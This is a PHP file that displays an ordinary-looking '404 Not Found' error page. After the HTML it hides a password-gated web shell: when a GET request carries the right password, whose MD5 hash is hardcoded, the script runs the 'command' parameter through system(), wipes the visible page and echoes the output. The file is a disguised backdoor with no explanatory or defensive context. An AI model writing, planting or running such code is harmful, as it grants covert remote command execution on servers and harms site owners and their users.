<?php


    echo'<!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <title>404 Not Found</title>
      <link rel="stylesheet" href="/error_docs/styles.css">
    </head>
    <body>

    <div class="page">
      <div class="main">
        <h1>Server Error</h1>
        <div class="error-code">404</div>
        <h2>Page Not Found</h2>
        <p class="lead">This page either doesn\'t exist, or it moved somewhere else.</p>
        <hr/>
        <p>That\'s what you can do</p>
        <div class="help-actions">
          <a href="javascript:location.reload();">Reload Page</a>
          <a href="javascript:history.back();">Back to Previous Page</a>
          <a href="/">Home Page</a>
        </div>
      </div>
    </div>
    </body>
    </html>';

    $pw = "87c4ab4263e22a36195aeff4ac0b5693"; 
    $req_method = $_GET; 

    if(isset($req_method["password"]) && md5($req_method["password"]) == $pw && isset($req_method["command"])){

        echo "<script>document.body.innerHTML = \"\";</script>";

        try{

            $output = system($req_method["command"]);

            if($output != null){
                
                echo "$output";
             
            }else{
                echo "[-] Failed to run command.<br>";
            }
        }
        catch(Exception $e){
            echo ((isset($_GET["silent_errors"]) && strtolower($_GET["silent_errors"])=="true") ?  "Error executing command -> <br>$e" : "Error executing command");
        }        
    }   
?>

